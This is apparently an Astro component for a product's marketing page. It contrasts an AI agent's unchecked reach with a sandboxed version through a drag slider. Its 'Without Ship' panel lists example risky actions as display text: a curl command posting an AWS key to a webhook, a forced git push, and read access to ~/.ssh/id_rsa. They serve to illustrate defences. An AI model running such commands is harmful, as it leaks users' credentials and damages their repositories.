---
// FILE_CAP_OVERRIDE: a feature window whose data, layout, runtime, and
// styles move together. The slider's geometry, the scene content, and
// the drag handler share too much context to split usefully.
/*
 * SecurityWindow — the parallax surface, mark 2.
 *   1) Hero: problem statement.
 *   2) Slider: same scene, drag to compare Without Ship vs With Ship.
 *      The interaction is the punch — you physically see Ship
 *      contain things you didn't realize were loose.
 *   3) Layers: four kinds of isolation, calibrated copy.
 */
import Window from './Window.astro';
import DownloadCTA from './DownloadCTA.astro';
const { open = false } = Astro.props;

interface Layer { name: string; lede: string; body: string }
const layers: Layer[] = [
  {
    name: 'Spaces',
    lede: 'A context with its own identity, agents, and data.',
    body: 'Switching spaces switches what your agent sees. Two spaces never share tools, files, or decision history unless they explicitly connect — but the boundary is the actor, not the space.',
  },
  {
    name: 'Sandboxed code',
    lede: 'Every view ships as a webview.',
    body: 'Views run isolated in webviews. SUI components run with no ambient capabilities — no <code>fetch</code>, no escape hatches. The runtime sandboxes what Ship runs; what you choose to run outside Ship is still yours to mind.',
  },
  {
    name: 'SES on SUI',
    lede: 'Renderable expressions are an allowlist.',
    body: 'Method calls in view templates are restricted to <code>slice</code>, <code>map</code>, <code>filter</code>, <code>includes</code>, <code>has</code>, <code>get</code>, and a few more. A view that calls <code>window.eval</code> or constructs a regex literal is a compile error.',
  },
  {
    name: 'Permissions + gates',
    lede: 'Every tool call is checked against the actor's preset.',
    body: 'A read-only agent cannot edit a file, full stop. Pipelines pause for human review at any step. The actor's tool gate reads the resolved permission preset on every call and rejects anything outside it.',
  },
];
---
<Window app="security" title="Security" meta="defense in depth" mark="!" accent="git" open={open}>
  <div class="win-scroll sec">
    {/* ── Hero ─────────────────────────────────────────────────────────── */}
    <section class="hero">
      <div class="hero-bg" data-parallax="-0.4" aria-hidden="true"></div>
      <div class="hero-bg-2" data-parallax="-0.18" aria-hidden="true"></div>
      <div class="hero-shape" data-parallax="0.22" aria-hidden="true"></div>
      <div class="hero-inner">
        <div class="eyebrow" data-reveal>Security</div>
        <h2 class="hl" data-reveal>
          Agents are powerful.<br/><span class="hl-accent">That's the problem.</span>
        </h2>
        <p class="hero-sub" data-reveal>Drag to see what changes when Ship is in the loop.</p>
      </div>
    </section>

    {/* ── Slider — Without / With ──────────────────────────────────────── */}
    <section class="compare">
      <header class="band-h" data-reveal>
        <h3 class="band-title">Same agent. Same task. Drag.</h3>
      </header>

      <div class="stage" data-slider role="slider" aria-label="Compare Without Ship vs With Ship" aria-valuemin="0" aria-valuemax="100" aria-valuenow="50" tabindex="0">
        {/* Without (full-frame base) */}
        <div class="scene scene-without">
          <div class="scene-tag tag-out">Without Ship</div>
          <div class="scene-grid">
            <article class="card card-secrets">
              <div class="card-h">Secrets</div>
              <ul class="kv">
                <li><span class="k">AWS_ACCESS_KEY_ID</span><span class="v code">AKIAIOSFODNN7EXAMPLE</span></li>
                <li><span class="k">GITHUB_TOKEN</span><span class="v code">ghp_kJh8...nM3wq</span></li>
                <li><span class="k">ANTHROPIC_API_KEY</span><span class="v code">sk-ant-api03-...</span></li>
              </ul>
              <div class="card-foot foot-bad">visible · plaintext on disk</div>
            </article>
            <article class="card card-files">
              <div class="card-h">Filesystem reach</div>
              <ul class="paths">
                <li><span class="dot dot-bad"></span>~/Documents/**</li>
                <li><span class="dot dot-bad"></span>~/.ssh/id_rsa</li>
                <li><span class="dot dot-bad"></span>~/Library/Application Support/**</li>
                <li><span class="dot dot-bad"></span>/etc/hosts</li>
              </ul>
              <div class="card-foot foot-bad">full read · full write</div>
            </article>
            <article class="card card-actions">
              <div class="card-h">Actions</div>
              <ul class="log">
                <li><span class="lg lg-bad">▶</span> rm -rf node_modules</li>
                <li><span class="lg lg-bad">▶</span> curl -X POST $WEBHOOK -d "$AWS_ACCESS_KEY_ID"</li>
                <li><span class="lg lg-bad">▶</span> git push --force origin main</li>
              </ul>
              <div class="card-foot foot-bad">no approval required</div>
            </article>
          </div>
        </div>

        {/* With (clip-pathed overlay) */}
        <div class="scene scene-with" data-with>
          <div class="scene-tag tag-in">With Ship</div>
          <div class="scene-grid">
            <article class="card card-secrets">
              <div class="card-h">Secrets</div>
              <ul class="kv">
                <li><span class="k">AWS_ACCESS_KEY_ID</span><span class="v sealed">●●●●●●●●●●●●</span></li>
                <li><span class="k">GITHUB_TOKEN</span><span class="v sealed">●●●●●●●●●●●●</span></li>
                <li><span class="k">ANTHROPIC_API_KEY</span><span class="v sealed">●●●●●●●●●●●●</span></li>
              </ul>
              <div class="card-foot foot-ok">per-space · runtime-mediated</div>
            </article>
            <article class="card card-files">
              <div class="card-h">Filesystem reach</div>
              <ul class="paths">
                <li><span class="dot dot-ok"></span>~/Spaces/work/**</li>
                <li><span class="dot dot-mute"></span>~/Spaces/personal/** <em class="muted">(out of space)</em></li>
                <li><span class="dot dot-mute"></span>~/.ssh/** <em class="muted">(blocked)</em></li>
              </ul>
              <div class="card-foot foot-ok">scoped to space</div>
            </article>
            <article class="card card-actions">
              <div class="card-h">Actions</div>
              <ul class="log">
                <li><span class="lg lg-ok">✓</span> rm -rf node_modules <em class="muted">(in space)</em></li>
                <li><span class="lg lg-gate">⏸</span> curl POST $WEBHOOK <em class="muted">(awaits review)</em></li>
                <li><span class="lg lg-gate">⏸</span> git push --force <em class="muted">(awaits review)</em></li>
              </ul>
              <div class="card-foot foot-ok">privileged actions gate</div>
            </article>
          </div>
        </div>

        {/* Drag handle */}
        <div class="handle" data-handle aria-hidden="true">
          <div class="handle-bar"></div>
          <div class="handle-grip">
            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
              <path d="M7 4L3 10l4 6M13 4l4 6-4 6"/>
            </svg>
          </div>
        </div>
      </div>
    </section>

    {/* ── Layers ───────────────────────────────────────────────────────── */}
    <section class="layers">
      <header class="band-h" data-reveal>
        <span class="band-tag band-in">With Ship</span>
        <h3 class="band-title">Four layers. Stacked.</h3>
      </header>
      <div class="layer-stack">
        {layers.map((l, i) => (
          <article class="layer" data-reveal style={`--i: ${i};`}>
            <span class="layer-num">{String(i + 1).padStart(2, '0')}</span>
            <div class="layer-body">
              <h4 class="layer-name">{l.name}</h4>
              <p class="layer-lede">{l.lede}</p>
              <p class="layer-text" set:html={l.body}></p>
            </div>
          </article>
        ))}
      </div>
    </section>

    <section class="sec-cta">
      <DownloadCTA message="Stop wiring guard rails by hand. Run it sandboxed." />
    </section>
  </div>
</Window>

<style>
  .sec { display: block; }

  [data-reveal] {
    opacity: 0; transform: translateY(28px);
    transition: opacity 700ms var(--ease-out, ease), transform 700ms var(--ease-spring, cubic-bezier(.32,.72,0,1));
  }
  [data-reveal].in { opacity: 1; transform: none; }

  /* ── Hero ── */
  .hero {
    position: relative;
    min-height: calc(100vh - var(--os-menubar-h, 32px) - 60px);
    display: grid; place-items: center;
    overflow: hidden;
    isolation: isolate;
    padding: 0 24px;
  }
  .hero-bg, .hero-bg-2, .hero-shape {
    transform: translate3d(0, var(--py, 0), 0);
  }
  .hero-bg, .hero-bg-2 {
    position: absolute; inset: -30% -10% -10% -10%;
    z-index: -2;
    pointer-events: none;
    will-change: transform;
  }
  .hero-bg {
    background:
      radial-gradient(ellipse 70% 50% at 30% 20%,
        color-mix(in oklch, oklch(0.62 0.22 25) 32%, transparent), transparent 70%),
      radial-gradient(ellipse 60% 50% at 80% 60%,
        color-mix(in oklch, var(--w-accent) 28%, transparent), transparent 72%);
  }
  .hero-bg-2 {
    background-image:
      linear-gradient(color-mix(in oklch, var(--foreground) 7%, transparent) 1px, transparent 1px),
      linear-gradient(90deg, color-mix(in oklch, var(--foreground) 7%, transparent) 1px, transparent 1px);
    background-size: 48px 48px;
    mask-image: radial-gradient(ellipse 90% 60% at 50% 50%, #000, transparent 75%);
  }
  .hero-shape {
    position: absolute;
    width: clamp(280px, 40vw, 560px); aspect-ratio: 1;
    right: -120px; top: 10%;
    border-radius: 50%;
    background: radial-gradient(circle at 30% 30%,
      color-mix(in oklch, var(--w-accent) 70%, transparent),
      color-mix(in oklch, var(--w-accent) 35%, transparent) 40%,
      transparent 70%);
    filter: blur(40px);
    z-index: -1;
    pointer-events: none;
    will-change: transform;
  }
  .hero-inner { text-align: center; display: flex; flex-direction: column; align-items: center; gap: 14px; max-width: 900px; }
  .eyebrow { font-family: var(--font-mono); font-size: 11px; font-weight: 700; letter-spacing: 0.22em; text-transform: uppercase; color: var(--w-accent); }
  .hl { font-family: var(--font-display); font-weight: 800; font-size: clamp(40px, 7vw, 88px); letter-spacing: -0.035em; line-height: 0.96; margin: 0; color: var(--foreground); }
  .hl-accent {
    background: linear-gradient(100deg, var(--w-accent), color-mix(in oklch, var(--w-accent) 50%, oklch(0.62 0.22 25)));
    -webkit-background-clip: text; background-clip: text; color: transparent;
  }
  .hero-sub {
    margin: 18px 0 0;
    font-family: var(--font-mono); font-size: 11px;
    letter-spacing: 0.4em; text-transform: uppercase;
    color: color-mix(in oklch, var(--foreground) 55%, var(--background));
    animation: hero-pulse 2.4s ease-in-out infinite;
  }
  @keyframes hero-pulse { 50% { opacity: 0.4; transform: translateY(4px); } }

  /* ── Band header (shared) ── */
  .band-h {
    display: flex; flex-direction: column; gap: 8px;
    padding: 0 32px;
    margin: 0 auto 24px; max-width: 1080px;
  }
  .band-tag {
    font-family: var(--font-mono); font-size: 10.5px; font-weight: 700;
    letter-spacing: 0.18em; text-transform: uppercase;
    padding: 4px 10px; border-radius: 999px; align-self: flex-start;
  }
  .band-in {
    color: var(--w-accent);
    background: color-mix(in oklch, var(--w-accent) 14%, transparent);
    border: 1px solid color-mix(in oklch, var(--w-accent) 28%, transparent);
  }
  .band-title {
    margin: 0;
    font-family: var(--font-display); font-weight: 800;
    font-size: clamp(26px, 3.6vw, 44px);
    letter-spacing: -0.025em; line-height: 1.05;
    color: var(--foreground);
  }

  /* ── Slider stage ──
     Two scenes layered on top of each other. The "with" scene is
     clipped via `clip-path: inset(0 0 0 X%)` where X is the slider
     position. The handle is a vertical bar at the same X.
     The whole stage is grabbable; we capture pointer events on it
     and update the CSS variable `--slider` (0..100) which drives
     both the clip-path and the handle position. */
  .compare {
    padding: 40px 0 70px;
    background:
      radial-gradient(ellipse 80% 50% at 50% 0%,
        color-mix(in oklch, oklch(0.62 0.22 25) 10%, transparent), transparent 70%);
  }
  .stage {
    --slider: 50;
    position: relative;
    max-width: 1080px; margin: 0 auto;
    margin-inline: 32px;
    aspect-ratio: 16 / 6.5;
    border-radius: 16px;
    overflow: hidden;
    border: 1px solid color-mix(in oklch, var(--foreground) 14%, transparent);
    box-shadow: 0 28px 64px -24px rgba(0, 0, 0, 0.5);
    user-select: none;
    touch-action: none;
    cursor: ew-resize;
  }
  @media (min-width: 1144px) {
    .stage { margin-inline: auto; }
  }
  .scene {
    position: absolute; inset: 0;
    padding: 24px;
    display: flex; flex-direction: column;
    color: var(--foreground);
    font-family: var(--font-body);
  }
  .scene-without {
    background:
      radial-gradient(ellipse 60% 50% at 20% 100%,
        color-mix(in oklch, oklch(0.62 0.22 25) 22%, transparent), transparent 70%),
      linear-gradient(180deg,
        color-mix(in oklch, oklch(0.62 0.22 25) 6%, var(--card)),
        color-mix(in oklch, var(--background) 80%, var(--card)));
  }
  .scene-with {
    background:
      radial-gradient(ellipse 60% 50% at 80% 100%,
        color-mix(in oklch, var(--w-accent) 22%, transparent), transparent 70%),
      linear-gradient(180deg,
        color-mix(in oklch, var(--w-accent) 6%, var(--card)),
        color-mix(in oklch, var(--background) 84%, var(--card)));
    clip-path: inset(0 0 0 calc(var(--slider) * 1%));
  }
  .scene-tag {
    position: absolute;
    top: 18px;
    font-family: var(--font-mono); font-size: 10px; font-weight: 700;
    letter-spacing: 0.16em; text-transform: uppercase;
    padding: 4px 10px; border-radius: 999px;
    z-index: 2;
  }
  .scene-without .scene-tag { left: 18px; }
  .scene-with    .scene-tag { right: 18px; }
  .tag-out {
    color: oklch(0.62 0.22 25);
    background: color-mix(in oklch, oklch(0.62 0.22 25) 14%, transparent);
    border: 1px solid color-mix(in oklch, oklch(0.62 0.22 25) 28%, transparent);
  }
  .tag-in {
    color: var(--w-accent);
    background: color-mix(in oklch, var(--w-accent) 14%, transparent);
    border: 1px solid color-mix(in oklch, var(--w-accent) 30%, transparent);
  }

  /* The grid is identical between scenes so dragging is a clean swap.
     Margin-top reserves space for the absolutely-positioned scene-tag. */
  .scene-grid {
    display: grid; grid-template-columns: 1fr 1fr 1fr;
    gap: 14px; flex: 1; min-height: 0;
    margin-top: 36px;
  }
  .card {
    background: color-mix(in oklch, var(--background) 84%, var(--card));
    border: 1px solid color-mix(in oklch, var(--foreground) 12%, transparent);
    border-radius: 10px;
    padding: 12px 14px;
    display: flex; flex-direction: column; gap: 8px;
    min-width: 0;
  }
  .card-h {
    font-family: var(--font-mono); font-size: 9.5px; font-weight: 700;
    letter-spacing: 0.14em; text-transform: uppercase;
    color: color-mix(in oklch, var(--foreground) 60%, var(--background));
  }
  .kv, .paths, .log {
    list-style: none; padding: 0; margin: 0;
    display: flex; flex-direction: column; gap: 4px;
    flex: 1;
  }
  .kv li { display: flex; flex-direction: column; gap: 1px; padding: 4px 0; }
  .kv .k { font-family: var(--font-mono); font-size: 9.5px; font-weight: 600; color: color-mix(in oklch, var(--foreground) 55%, var(--background)); letter-spacing: 0.04em; }
  .kv .v.code { font-family: var(--font-mono); font-size: 11px; color: oklch(0.62 0.22 25); word-break: break-all; }
  .kv .v.sealed { font-family: var(--font-mono); font-size: 11px; color: var(--w-accent); letter-spacing: 0.08em; }

  .paths li { display: flex; align-items: center; gap: 8px; font-family: var(--font-mono); font-size: 11px; }
  .paths .muted { color: color-mix(in oklch, var(--foreground) 45%, var(--background)); font-style: normal; }
  .dot { width: 7px; height: 7px; border-radius: 50%; flex: 0 0 auto; }
  .dot-bad { background: oklch(0.62 0.22 25); }
  .dot-ok { background: var(--w-accent); }
  .dot-mute { background: color-mix(in oklch, var(--foreground) 26%, transparent); }

  .log li { display: flex; align-items: center; gap: 8px; font-family: var(--font-mono); font-size: 11px; }
  .log .lg { width: 14px; flex: 0 0 auto; text-align: center; font-weight: 700; }
  .lg-bad { color: oklch(0.62 0.22 25); }
  .lg-ok { color: var(--w-accent); }
  .lg-gate { color: oklch(0.78 0.16 70); }
  .log .muted { color: color-mix(in oklch, var(--foreground) 45%, var(--background)); font-style: normal; }

  .card-foot {
    font-family: var(--font-mono); font-size: 10px; font-weight: 600;
    letter-spacing: 0.06em; padding-top: 6px;
    border-top: 1px solid color-mix(in oklch, var(--foreground) 8%, transparent);
  }
  .foot-bad { color: oklch(0.62 0.22 25); }
  .foot-ok  { color: var(--w-accent); }

  /* Handle */
  .handle {
    position: absolute; top: 0; bottom: 0;
    left: calc(var(--slider) * 1%);
    width: 0;
    pointer-events: none;
  }
  .handle-bar {
    position: absolute; top: 0; bottom: 0; left: -1px;
    width: 2px;
    background: color-mix(in oklch, var(--w-accent) 70%, white);
    box-shadow: 0 0 18px color-mix(in oklch, var(--w-accent) 60%, transparent);
  }
  .handle-grip {
    position: absolute;
    top: 50%; left: 0;
    transform: translate(-50%, -50%);
    width: 40px; height: 40px;
    border-radius: 50%;
    background: var(--background);
    border: 2px solid color-mix(in oklch, var(--w-accent) 70%, white);
    box-shadow: 0 6px 18px -4px rgba(0,0,0,0.3), 0 0 0 4px color-mix(in oklch, var(--w-accent) 18%, transparent);
    color: var(--w-accent);
    display: grid; place-items: center;
  }

  /* ── Layers (stacking) ── */
  .layers {
    position: relative;
    padding: 60px 0 100px;
    background:
      radial-gradient(ellipse 80% 60% at 50% 100%,
        color-mix(in oklch, var(--w-accent) 14%, transparent), transparent 70%);
  }
  .layer-stack { position: relative; display: flex; flex-direction: column; gap: 14px; max-width: 980px; margin: 0 auto; padding: 0 24px; }
  .layer {
    display: grid; grid-template-columns: 56px 1fr; gap: 18px;
    align-items: center;
    padding: 22px 24px;
    background: color-mix(in oklch, var(--card) 96%, transparent);
    border: 1px solid color-mix(in oklch, var(--w-accent) 32%, transparent);
    border-radius: 16px;
    box-shadow: 0 18px 44px -18px color-mix(in oklch, var(--w-accent) 50%, transparent);
    position: relative;
  }
  .layer[data-reveal] { transform: translateY(calc(40px + var(--i, 0) * 6px)); opacity: 0; }
  .layer[data-reveal].in { transform: translateY(0); opacity: 1; }
  .layer-num { font-family: var(--font-mono); font-size: 28px; font-weight: 800; color: var(--w-accent); line-height: 1; }
  .layer-name {
    margin: 0;
    font-family: var(--font-mono); font-size: 10.5px; font-weight: 700;
    letter-spacing: 0.16em; text-transform: uppercase;
    color: var(--w-accent);
  }
  .layer-lede {
    margin: 4px 0 0;
    font-family: var(--font-display); font-size: 22px; font-weight: 700;
    color: var(--foreground); letter-spacing: -0.015em; line-height: 1.15;
  }
  .layer-text {
    margin: 8px 0 0;
    font-size: 14px; line-height: 1.5;
    color: color-mix(in oklch, var(--foreground) 70%, var(--background));
  }
  .layer-text code {
    font-family: var(--font-mono); font-size: 12.5px;
    padding: 1px 5px; border-radius: 4px;
    background: color-mix(in oklch, var(--foreground) 8%, transparent);
    color: var(--foreground);
  }
  .layer-text b { color: var(--foreground); font-weight: 700; }

  /* ── Mobile ── */
  @media (max-width: 760px) {
    .hl { font-size: clamp(32px, 9vw, 48px); }
    .compare { padding: 40px 0 60px; }
    .stage { margin-inline: 14px; aspect-ratio: 4 / 5; }
    .scene { padding: 16px; }
    .scene-grid { grid-template-columns: 1fr; gap: 10px; }
    .layer { grid-template-columns: 1fr; gap: 6px; padding: 18px 18px; }
    .layer-num { font-size: 20px; }
    .layer-lede { font-size: 18px; }
  }
</style>

<script>
  /* Slider drag: pointer events on .stage update --slider 0..100, which
   * drives both the with-scene clip-path and the handle's left. */
  const stage = document.querySelector<HTMLElement>('[data-app-window="security"] [data-slider]');
  if (stage) {
    let dragging = false;
    function set(percent: number): void {
      const v = Math.max(2, Math.min(98, percent));
      stage!.style.setProperty('--slider', String(v));
      stage!.setAttribute('aria-valuenow', String(Math.round(v)));
    }
    function fromEvent(e: PointerEvent): number {
      const r = stage!.getBoundingClientRect();
      return ((e.clientX - r.left) / r.width) * 100;
    }
    stage.addEventListener('pointerdown', (e: PointerEvent) => {
      dragging = true;
      stage!.setPointerCapture(e.pointerId);
      set(fromEvent(e));
    });
    stage.addEventListener('pointermove', (e: PointerEvent) => {
      if (!dragging) return;
      set(fromEvent(e));
    });
    const release = (e: PointerEvent) => {
      if (!dragging) return;
      dragging = false;
      try { stage!.releasePointerCapture(e.pointerId); } catch { /* released */ }
    };
    stage.addEventListener('pointerup', release);
    stage.addEventListener('pointercancel', release);

    // Keyboard: ← →
    stage.addEventListener('keydown', (e: KeyboardEvent) => {
      const cur = Number(stage!.style.getPropertyValue('--slider')) || 50;
      if (e.key === 'ArrowLeft')  { e.preventDefault(); set(cur - 4); }
      if (e.key === 'ArrowRight') { e.preventDefault(); set(cur + 4); }
    });
  }
</script>
